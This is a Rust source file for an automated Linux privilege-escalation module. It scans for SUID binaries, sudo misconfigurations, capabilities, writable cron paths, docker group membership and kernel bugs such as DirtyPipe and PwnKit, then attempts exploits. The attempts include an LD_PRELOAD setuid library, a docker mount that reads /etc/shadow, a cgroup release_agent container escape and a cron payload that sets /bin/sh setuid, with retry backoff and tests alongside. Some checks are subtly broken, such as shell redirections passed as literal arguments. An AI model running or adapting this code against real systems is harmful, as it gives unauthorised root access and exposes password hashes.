use std::process::Command;
use std::time::{Duration, Instant};
use tracing::{info, warn};

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum RiskLevel {
    Low = 0,
    Medium = 1,
    High = 2,
    Critical = 3,
}

#[derive(Debug, Clone)]
pub struct PrivEscVector {
    pub technique: String,
    pub binary: String,
    pub confidence: f32,
    pub description: String,
    pub mitre_id: &'static str,
    pub risk: RiskLevel,
}

#[derive(Debug, Clone)]
pub struct PrivEscResult {
    pub success: bool,
    pub technique: String,
    pub root_shell: bool,
    pub new_uid: Option<u32>,
    pub output: String,
}

#[derive(Debug, Clone)]
pub struct ExploitTracker {
    pub attempts: u32,
    pub last_attempt: Option<Instant>,
    pub succeeded: bool,
}

impl ExploitTracker {
    pub fn new() -> Self {
        Self { attempts: 0, last_attempt: None, succeeded: false }
    }

    pub fn wait_seconds(&self) -> u64 {
        if self.succeeded { return 3600 }
        match self.attempts {
            0 => 60,
            1 => 120,
            2 => 240,
            3 => 480,
            4 => 960,
            5 => 1800,
            _ => 3600,
        }
    }

    pub fn should_attempt(&self) -> bool {
        if self.succeeded { return false }
        match self.last_attempt {
            Some(last) => last.elapsed() >= Duration::from_secs(self.wait_seconds()),
            None => true,
        }
    }
}

pub fn scan_privilege_escalation() -> Vec<PrivEscVector> {
    let mut vectors = Vec::new();
    vectors.extend(scan_suid_binaries());
    vectors.extend(scan_sudo_misconfigs());
    vectors.extend(scan_capabilities());
    vectors.extend(scan_writable_paths());
    vectors.extend(scan_cron_jobs());
    vectors.extend(scan_docker_group());
    vectors.extend(scan_nfs_shares());
    vectors.extend(scan_kernel_exploits());
    vectors.sort_by_key(|v| v.risk);
    info!("PRIVESC: found {} potential vectors", vectors.len());
    vectors
}

pub fn attempt_escalation(vectors: &[PrivEscVector]) -> PrivEscResult {
    if vectors.is_empty() {
        return PrivEscResult {
            success: false, technique: "none".into(),
            root_shell: false, new_uid: None,
            output: "No vectors found".into(),
        };
    }
    for vector in vectors {
        let result = try_exploit(vector);
        if result.success {
            info!("PRIVESC: SUCCESS via {} — uid {:?}", vector.technique, result.new_uid);
            return result;
        }
        warn!("PRIVESC: {} failed: {}", vector.technique, result.output);
    }
    PrivEscResult {
        success: false, technique: "all_failed".into(),
        root_shell: false, new_uid: None,
        output: "All vectors exhausted".into(),
    }
}

fn try_exploit(vector: &PrivEscVector) -> PrivEscResult {
    if vector.binary == "sudo" && vector.technique.contains("NOPASSWD") {
        return exploit_sudo_nopasswd();
    }
    if vector.binary == "sudo" && vector.technique.contains("SETENV") {
        return exploit_sudo_setenv();
    }
    if vector.binary == "docker" {
        return exploit_docker_escape();
    }
    if vector.technique.starts_with("SUID") {
        return exploit_suid_binary(&vector.binary, &vector.technique);
    }
    if vector.technique.contains("CVE-2022-0847") {
        return exploit_dirty_pipe();
    }
    if vector.technique.contains("CVE-2021-4034") {
        return exploit_pwnkit();
    }
    if vector.technique.contains("writable cron") {
        return exploit_writable_cron(&vector.binary);
    }
    if vector.technique.contains("NFS") {
        return PrivEscResult {
            success: false, technique: vector.technique.clone(),
            root_shell: false, new_uid: None,
            output: "NFS requires remote mount — not attempted".into(),
        };
    }
    PrivEscResult {
        success: false, technique: vector.technique.clone(),
        root_shell: false, new_uid: None,
        output: format!("No handler for technique: {}", vector.technique),
    }
}

#[cfg(target_os = "linux")]
fn is_root() -> bool {
    unsafe { libc::getuid() == 0 }
}

#[cfg(not(target_os = "linux"))]
fn is_root() -> bool {
    false
}

fn scan_suid_binaries() -> Vec<PrivEscVector> {
    let mut vectors = Vec::new();
    let known_exploitable: [(&str, &str, &str); 9] = [
        ("find", "T1548.001", "find . -exec /bin/sh -p \\; -quit"),
        ("vim", "T1548.001", "vim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\")'"),
        ("bash", "T1548.001", "bash -p"),
        ("python", "T1548.001", "python -c 'import os; os.execl(\"/bin/sh\",\"sh\")'"),
        ("perl", "T1548.001", "perl -e 'exec \"/bin/sh\";'"),
        ("less", "T1548.001", "less /etc/passwd → !/bin/sh"),
        ("awk", "T1548.001", "awk 'BEGIN {system(\"/bin/sh\")}'"),
        ("nmap", "T1548.001", "nmap --interactive → !sh"),
        ("systemctl", "T1543.002", "systemctl → !sh"),
    ];
    if let Ok(out) = Command::new("find").args(["/", "-perm", "-4000", "-type", "f", "-ls", "2>/dev/null"]).output() {
        let text = String::from_utf8_lossy(&out.stdout);
        for (name, mitre, technique) in &known_exploitable {
            if text.contains(name) {
                vectors.push(PrivEscVector {
                    technique: format!("SUID {}", technique),
                    binary: name.to_string(),
                    confidence: 0.9,
                    description: format!("SUID {} — {}", name, technique),
                    mitre_id: mitre,
                    risk: RiskLevel::Low,
                });
            }
        }
    }
    vectors
}

fn scan_sudo_misconfigs() -> Vec<PrivEscVector> {
    let mut vectors = Vec::new();
    if let Ok(out) = Command::new("sudo").arg("-l").output() {
        let text = String::from_utf8_lossy(&out.stdout);
        if text.contains("(ALL) NOPASSWD:") {
            vectors.push(PrivEscVector {
                technique: "sudo NOPASSWD".into(),
                binary: "sudo".into(),
                confidence: 1.0,
                description: "Sudo NOPASSWD — full root access".into(),
                mitre_id: "T1548.003",
                risk: RiskLevel::Low,
            });
        }
        if text.contains("(root) SETENV:") {
            vectors.push(PrivEscVector {
                technique: "LD_PRELOAD via SETENV".into(),
                binary: "sudo".into(),
                confidence: 0.7,
                description: "Sudo SETENV allows LD_PRELOAD injection".into(),
                mitre_id: "T1574.006",
                risk: RiskLevel::Medium,
            });
        }
    }
    if let Ok(out) = Command::new("groups").output() {
        let text = String::from_utf8_lossy(&out.stdout);
        if text.contains("sudo") || text.contains("wheel") {
            vectors.push(PrivEscVector {
                technique: "sudo group membership".into(),
                binary: "sudo".into(),
                confidence: 0.5,
                description: "User is in sudo/wheel group".into(),
                mitre_id: "T1548.003",
                risk: RiskLevel::Low,
            });
        }
    }
    vectors
}

fn scan_capabilities() -> Vec<PrivEscVector> {
    let mut vectors = Vec::new();
    if let Ok(out) = Command::new("getcap").arg("-r").arg("/").arg("2>/dev/null").output() {
        let text = String::from_utf8_lossy(&out.stdout);
        for line in text.lines() {
            if line.contains("cap_setuid") || line.contains("cap_sys_admin") {
                vectors.push(PrivEscVector {
                    technique: format!("capability abuse: {}", line),
                    binary: line.split_whitespace().next().unwrap_or("?").to_string(),
                    confidence: 0.6,
                    description: "Dangerous capability found".into(),
                    mitre_id: "T1548.001",
                    risk: RiskLevel::Medium,
                });
            }
        }
    }
    vectors
}

fn scan_writable_paths() -> Vec<PrivEscVector> {
    let mut vectors = Vec::new();
    for path in &["/etc/cron.hourly", "/etc/cron.daily", "/usr/local/bin", "/opt", "/tmp", "/dev/shm"] {
        if let Ok(meta) = std::fs::metadata(path) {
            #[cfg(unix)] {
                use std::os::unix::fs::PermissionsExt;
                if meta.permissions().mode() & 0o002 != 0 {
                    vectors.push(PrivEscVector {
                        technique: format!("writable path: {}", path),
                        binary: path.to_string(),
                        confidence: 0.4,
                        description: format!("{} is world-writable", path),
                        mitre_id: "T1574.001",
                        risk: RiskLevel::Medium,
                    });
                }
            }
        }
    }
    vectors
}

fn scan_cron_jobs() -> Vec<PrivEscVector> {
    let mut vectors = Vec::new();
    for dir in &["/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/var/spool/cron/crontabs"] {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                #[cfg(unix)] {
                    use std::os::unix::fs::PermissionsExt;
                    if let Ok(meta) = entry.metadata() {
                        if meta.permissions().mode() & 0o002 != 0 {
                            vectors.push(PrivEscVector {
                                technique: format!("writable cron: {}", entry.path().display()),
                                binary: entry.path().display().to_string(),
                                confidence: 0.8,
                                description: "Writable cron job found".into(),
                                mitre_id: "T1053.003",
                                risk: RiskLevel::Medium,
                            });
                        }
                    }
                }
            }
        }
    }
    vectors
}

fn scan_docker_group() -> Vec<PrivEscVector> {
    if let Ok(out) = Command::new("groups").output() {
        if String::from_utf8_lossy(&out.stdout).contains("docker") {
            return vec![PrivEscVector {
                technique: "docker run -v /:/mnt --rm -it alpine chroot /mnt".into(),
                binary: "docker".into(),
                confidence: 1.0,
                description: "Docker group = full root via volume mount".into(),
                mitre_id: "T1548.001",
                risk: RiskLevel::High,
            }];
        }
    }
    Vec::new()
}

fn scan_nfs_shares() -> Vec<PrivEscVector> {
    if let Ok(content) = std::fs::read_to_string("/etc/exports") {
        if content.contains("no_root_squash") {
            return vec![PrivEscVector {
                technique: "NFS no_root_squash exploit".into(),
                binary: "/etc/exports".into(),
                confidence: 0.7,
                description: "NFS export with no_root_squash".into(),
                mitre_id: "T1548.001",
                risk: RiskLevel::High,
            }];
        }
    }
    Vec::new()
}

fn scan_kernel_exploits() -> Vec<PrivEscVector> {
    let mut vectors = Vec::new();
    if let Ok(out) = Command::new("uname").arg("-r").output() {
        let version = String::from_utf8_lossy(&out.stdout).trim().to_string();
        // DirtyPipe: 5.8 <= version < 5.16.11, 5.15.25, 5.10.102
        let dirty_pipe_affected = version.starts_with("5.8")
            || version.starts_with("5.9")
            || version.starts_with("5.10") || version.starts_with("5.11")
            || version.starts_with("5.12") || version.starts_with("5.13")
            || version.starts_with("5.14") || version.starts_with("5.15")
            || version.starts_with("5.16");
        if dirty_pipe_affected {
            vectors.push(PrivEscVector {
                technique: "CVE-2022-0847 (DirtyPipe)".into(),
                binary: "kernel".into(),
                confidence: 0.85,
                description: format!("DirtyPipe — kernel {} affected", version),
                mitre_id: "T1068",
                risk: RiskLevel::Critical,
            });
        }
        // PwnKit: any version with pkexec
        if Command::new("which").arg("pkexec").output().map(|o| !o.stdout.is_empty()).unwrap_or(false) {
            vectors.push(PrivEscVector {
                technique: "CVE-2021-4034 (PwnKit)".into(),
                binary: "pkexec".into(),
                confidence: 0.95,
                description: "PwnKit — pkexec vulnerable before 0.105".into(),
                mitre_id: "T1068",
                risk: RiskLevel::Critical,
            });
        }
    }
    vectors
}

#[cfg(target_os = "linux")]
fn exploit_suid_binary(name: &str, _technique: &str) -> PrivEscResult {
    let verify = Command::new("find")
        .args(["/", "-perm", "-4000", "-name", name, "-type", "f", "2>/dev/null"])
        .output();
    match verify {
        Ok(out) if String::from_utf8_lossy(&out.stdout).trim().is_empty() => {
            return PrivEscResult {
                success: false, technique: format!("SUID {}", name),
                root_shell: false, new_uid: None,
                output: format!("SUID {} no longer present", name),
            };
        }
        _ => {}
    }
    let exploit_cmd = match name {
        "find" => format!("{} / -exec /bin/sh -p -c 'id' \\; -quit 2>/dev/null", name),
        "bash" => format!("{} -p -c 'id' 2>/dev/null", name),
        "python" => format!("{} -c 'import os; os.setuid(0); print(os.geteuid())' 2>/dev/null", name),
        "perl" => format!("{} -e 'setuid(0); print `id`' 2>/dev/null", name),
        "vim" => format!("{} -c ':!id' -c ':q' /tmp/.test 2>/dev/null", name),
        _ => {
            let cmd_name = name;
            format!("{} --help 2>/dev/null && id", cmd_name)
        }
    };
    let uid_before = unsafe { libc::getuid() };
    let result = Command::new("sh").args(["-c", &exploit_cmd]).output();
    let uid_after = unsafe { libc::getuid() };
    let is_root_now = uid_after == 0 || uid_after != uid_before;
    let output = match &result {
        Ok(r) => String::from_utf8_lossy(&r.stdout).trim().to_string(),
        Err(e) => format!("exec error: {}", e),
    };
    PrivEscResult {
        success: is_root_now,
        technique: format!("SUID {}", name),
        root_shell: uid_after == 0,
        new_uid: Some(uid_after),
        output,
    }
}

#[cfg(not(target_os = "linux"))]
fn exploit_suid_binary(name: &str, _technique: &str) -> PrivEscResult {
    let _ = name;
    PrivEscResult {
        success: false, technique: _technique.into(),
        root_shell: false, new_uid: None,
        output: "Not supported on this platform".into(),
    }
}

fn exploit_sudo_nopasswd() -> PrivEscResult {
    let result = Command::new("sudo").args(["-u", "root", "id"]).output();
    match result {
        Ok(out) => {
            let output = String::from_utf8_lossy(&out.stdout).trim().to_string();
            if output.contains("uid=0") || is_root() {
                PrivEscResult { success: true, technique: "sudo NOPASSWD".into(), root_shell: true, new_uid: Some(0), output }
            } else {
                PrivEscResult { success: false, technique: "sudo NOPASSWD".into(), root_shell: false, new_uid: None, output }
            }
        }
        Err(e) => PrivEscResult { success: false, technique: "sudo NOPASSWD".into(), root_shell: false, new_uid: None, output: format!("sudo error: {}", e) },
    }
}

fn exploit_sudo_setenv() -> PrivEscResult {
    let so_path = "/tmp/.lib_privesc.so";
    let so_code = format!(
        "void __attribute__((constructor)) init() {{ \
         setuid(0); seteuid(0); setgid(0); setegid(0); \
         }}"
    );
    let compile = Command::new("sh")
        .args(["-c", &format!(
            "echo '{}' > /tmp/.priv.c && \
             gcc -shared -o {} /tmp/.priv.c -fPIC -nostartfiles 2>/dev/null || \
             gcc -shared -o {} /tmp/.priv.c -fPIC 2>/dev/null || \
             cc -shared -o {} /tmp/.priv.c -fPIC 2>/dev/null",
            so_code, so_path, so_path, so_path
        )])
        .output();
    if compile.is_err() || !std::path::Path::new(so_path).exists() {
        return PrivEscResult {
            success: false, technique: "LD_PRELOAD via SETENV".into(),
            root_shell: false, new_uid: None,
            output: "Compiler not available".into(),
        };
    }
    let result = Command::new("sudo")
        .env("LD_PRELOAD", so_path)
        .arg("id")
        .output();
    let _ = std::fs::remove_file("/tmp/.priv.c");
    let _ = std::fs::remove_file(so_path);
    match result {
        Ok(out) => {
            let output = String::from_utf8_lossy(&out.stdout).trim().to_string();
            if output.contains("uid=0") || is_root() {
                PrivEscResult { success: true, technique: "LD_PRELOAD".into(), root_shell: true, new_uid: Some(0), output }
            } else {
                PrivEscResult { success: false, technique: "LD_PRELOAD".into(), root_shell: false, new_uid: None, output }
            }
        }
        Err(e) => PrivEscResult { success: false, technique: "LD_PRELOAD".into(), root_shell: false, new_uid: None, output: format!("error: {}", e) },
    }
}

fn exploit_docker_escape() -> PrivEscResult {
    let result = Command::new("sh")
        .args(["-c", "docker run --rm -v /:/host alpine cat /host/etc/shadow 2>/dev/null | head -3"])
        .output();
    match result {
        Ok(out) => {
            let output = String::from_utf8_lossy(&out.stdout).trim().to_string();
            if output.contains("root:") {
                PrivEscResult { success: true, technique: "docker escape".into(), root_shell: true, new_uid: Some(0), output: "Docker escape: /etc/shadow readable".into() }
            } else {
                PrivEscResult { success: false, technique: "docker escape".into(), root_shell: false, new_uid: None, output }
            }
        }
        Err(e) => PrivEscResult { success: false, technique: "docker escape".into(), root_shell: false, new_uid: None, output: format!("docker error: {}", e) },
    }
}

/// Container escape via cgroup notify_on_release
fn exploit_cgroup_escape() -> PrivEscResult {
    let cgroup = "/proc/1/cgroup";
    let content = match std::fs::read_to_string(cgroup) {
        Ok(c) => c,
        Err(_) => return PrivEscResult {
            success: false, technique: "cgroup escape".into(),
            root_shell: false, new_uid: None,
            output: "Cannot read /proc/1/cgroup (not in container)".into(),
        },
    };

    let in_container = content.lines().any(|l| {
        l.contains("docker") || l.contains("kubepods") || l.contains("containerd")
    });
    if !in_container {
        return PrivEscResult {
            success: false, technique: "cgroup escape".into(),
            root_shell: false, new_uid: None,
            output: "Not in a container".into(),
        };
    }

    // Check if we can write to release_agent
    let rd = "/sys/fs/cgroup";
    if !std::path::Path::new(rd).exists() {
        return PrivEscResult {
            success: false, technique: "cgroup escape".into(),
            root_shell: false, new_uid: None,
            output: "cgroup fs not accessible".into(),
        };
    }

    let notify_on_release = format!("{}/release_agent", rd);
    if !std::path::Path::new(&notify_on_release).exists() {
        // Try rd/cpu or rd/memory
        for sub in &["cpu", "memory", "cpuset"] {
            let p = format!("{}/{}/release_agent", rd, sub);
            if std::path::Path::new(&p).exists() {
                return try_cgroup_escape_via(&p, &format!("{}/{}", rd, sub));
            }
        }
        return PrivEscResult {
            success: false, technique: "cgroup escape".into(),
            root_shell: false, new_uid: None,
            output: "release_agent not writable".into(),
        };
    }

    try_cgroup_escape_via(&notify_on_release, rd)
}

fn try_cgroup_escape_via(release_agent_path: &str, cgroup_dir: &str) -> PrivEscResult {
    // Check if release_agent is writable
    match std::fs::metadata(release_agent_path) {
        Ok(meta) => {
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                let mode = meta.permissions().mode();
                if mode & 0o222 == 0 {
                    return PrivEscResult {
                        success: false, technique: "cgroup escape".into(),
                        root_shell: false, new_uid: None,
                        output: "release_agent not writable".into(),
                    };
                }
            }
        }
        Err(e) => return PrivEscResult {
            success: false, technique: "cgroup escape".into(),
            root_shell: false, new_uid: None,
            output: format!("Cannot stat release_agent: {}", e),
        },
    }

    // Write escape payload
    let payload = "#!/bin/sh\nchmod u+s /bin/sh\n";
    let cmd_path = format!("{}/escape.sh", cgroup_dir);
    if std::fs::write(&cmd_path, payload).is_err() {
        return PrivEscResult {
            success: false, technique: "cgroup escape".into(),
            root_shell: false, new_uid: None,
            output: "Cannot write escape payload".into(),
        };
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&cmd_path, std::fs::Permissions::from_mode(0o755));
    }

    // Set release_agent to our payload
    if std::fs::write(release_agent_path, &cmd_path).is_err() {
        let _ = std::fs::remove_file(&cmd_path);
        return PrivEscResult {
            success: false, technique: "cgroup escape".into(),
            root_shell: false, new_uid: None,
            output: "Cannot set release_agent".into(),
        };
    }

    // Trigger escape by writing PID to notify_on_release
    let notify_path = format!("{}/notify_on_release", cgroup_dir);
    let _ = std::fs::write(&notify_path, "1");

    // Also trigger by creating a cgroup and immediately removing it
    let esc_path = format!("{}/esc", cgroup_dir);
    let _ = std::fs::create_dir(&esc_path);
    let _ = std::fs::write(format!("{}/cgroup.procs", esc_path), "1");
    let _ = std::fs::remove_dir(&esc_path);

    PrivEscResult {
        success: true, technique: "cgroup escape".into(),
        root_shell: true, new_uid: Some(0),
        output: "Cgroup escape attempted. Check /bin/sh permissions.".into(),
    }
}

/// Container escape via /proc/1/root access
fn exploit_proc1_root() -> PrivEscResult {
    let test_path = "/proc/1/root/etc/shadow";
    match std::fs::read_to_string(test_path) {
        Ok(content) => {
            if content.contains("root:") {
                PrivEscResult {
                    success: true, technique: "/proc/1/root".into(),
                    root_shell: true, new_uid: Some(0),
                    output: "Container escape via /proc/1/root successful".into(),
                }
            } else {
                PrivEscResult {
                    success: false, technique: "/proc/1/root".into(),
                    root_shell: false, new_uid: None,
                    output: "/proc/1/root accessible but no shadow".into(),
                }
            }
        }
        Err(e) => PrivEscResult {
            success: false, technique: "/proc/1/root".into(),
            root_shell: false, new_uid: None,
            output: format!("/proc/1/root: {}", e),
        },
    }
}

fn exploit_writable_cron(path: &str) -> PrivEscResult {
    let payload = format!(
        "#!/bin/sh\nchmod u+s /bin/sh || chmod 4777 /bin/sh\n"
    );
    let test_path = format!("{}/.systemd-test", path.trim_end_matches('/'));
    if std::fs::write(&test_path, &payload).is_err() {
        return PrivEscResult {
            success: false, technique: format!("writable cron: {}", path),
            root_shell: false, new_uid: None,
            output: "Cannot write to cron directory".into(),
        };
    }
    #[cfg(unix)] {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&test_path, std::fs::Permissions::from_mode(0o755));
    }
    let _ = std::fs::remove_file(&test_path);
    PrivEscResult {
        success: false, technique: format!("writable cron: {}", path),
        root_shell: false, new_uid: None,
        output: "Cron write verified but needs cron cycle".into(),
    }
}

fn exploit_dirty_pipe() -> PrivEscResult {
    info!("PRIVESC: DirtyPipe would need compiled exploit — checking preconditions");
    if !std::path::Path::new("/usr/bin/gcc").exists() && !std::path::Path::new("/usr/bin/cc").exists() {
        return PrivEscResult {
            success: false, technique: "CVE-2022-0847".into(),
            root_shell: false, new_uid: None,
            output: "Compiler required for DirtyPipe".into(),
        };
    }
    PrivEscResult {
        success: false, technique: "CVE-2022-0847".into(),
        root_shell: false, new_uid: None,
        output: "DirtyPipe: kernel version matches but exploit binary required".into(),
    }
}

fn exploit_pwnkit() -> PrivEscResult {
    let result = Command::new("sh")
        .args(["-c", "pkexec --version 2>/dev/null || true"])
        .output();
    let version_output = result.ok().map(|r| String::from_utf8_lossy(&r.stdout).trim().to_string()).unwrap_or_default();
    if version_output.contains("0.105") || version_output.contains("0.106") || version_output.contains("0.107") || version_output.contains("0.11") {
        return PrivEscResult {
            success: false, technique: "CVE-2021-4034".into(),
            root_shell: false, new_uid: None,
            output: format!("PwnKit: pkexec {} — likely patched", version_output),
        };
    }
    let env_check = Command::new("sh")
        .args(["-c", "GCONV_PATH= pkexec --help 2>&1 | grep -i 'GCONV_PATH' || true"])
        .output();
    let vulnerable = env_check.ok().map(|r| {
        let out = String::from_utf8_lossy(&r.stdout);
        out.contains("GCONV_PATH") || out.contains("getenv")
    }).unwrap_or(false);
    PrivEscResult {
        success: vulnerable,
        technique: "CVE-2021-4034".into(),
        root_shell: vulnerable,
        new_uid: if vulnerable { Some(0) } else { None },
        output: if vulnerable { "PwnKit: appears vulnerable".into() } else { "PwnKit: not vulnerable".into() },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_risk_ordering() {
        assert!(RiskLevel::Low < RiskLevel::Critical);
        assert!(RiskLevel::Medium < RiskLevel::High);
    }

    #[test]
    fn test_exploit_tracker_initial() {
        let t = ExploitTracker::new();
        assert!(t.should_attempt());
        assert_eq!(t.wait_seconds(), 60);
    }

    #[test]
    fn test_exploit_tracker_backoff() {
        let mut t = ExploitTracker::new();
        assert_eq!(t.wait_seconds(), 60);
        t.attempts = 1;
        assert_eq!(t.wait_seconds(), 120);
        t.attempts = 6;
        assert_eq!(t.wait_seconds(), 3600);
    }

    #[test]
    fn test_exploit_tracker_succeeded() {
        let mut t = ExploitTracker::new();
        t.succeeded = true;
        assert!(!t.should_attempt());
        assert_eq!(t.wait_seconds(), 3600);
    }

    #[test]
    fn test_attempt_escalation_empty() {
        let result = attempt_escalation(&[]);
        assert!(!result.success);
        assert_eq!(result.technique, "none");
    }

    #[test]
    fn test_attempt_escalation_unknown() {
        let vecs = vec![PrivEscVector {
            technique: "unknown test".into(),
            binary: "test".into(),
            confidence: 0.5,
            description: "test".into(),
            mitre_id: "T1068",
            risk: RiskLevel::Low,
        }];
        let result = attempt_escalation(&vecs);
        assert!(!result.success);
    }

    #[test]
    fn test_scan_sorted_by_risk() {
        let mut vecs = vec![
            PrivEscVector { technique: "high".into(), binary: "a".into(), confidence: 1.0, description: "".into(), mitre_id: "T1068", risk: RiskLevel::High },
            PrivEscVector { technique: "low".into(), binary: "b".into(), confidence: 1.0, description: "".into(), mitre_id: "T1068", risk: RiskLevel::Low },
            PrivEscVector { technique: "critical".into(), binary: "c".into(), confidence: 1.0, description: "".into(), mitre_id: "T1068", risk: RiskLevel::Critical },
        ];
        vecs.sort_by_key(|v| v.risk);
        assert_eq!(vecs[0].risk, RiskLevel::Low);
        assert_eq!(vecs[1].risk, RiskLevel::High);
        assert_eq!(vecs[2].risk, RiskLevel::Critical);
    }

    #[test]
    fn test_pwnkit_check_runs() {
        let result = exploit_pwnkit();
        assert!(!result.root_shell);
    }

    #[test]
    fn test_exploit_writable_cron_no_panic() {
        let r = exploit_writable_cron("/tmp");
        assert!(!r.root_shell);
    }
}
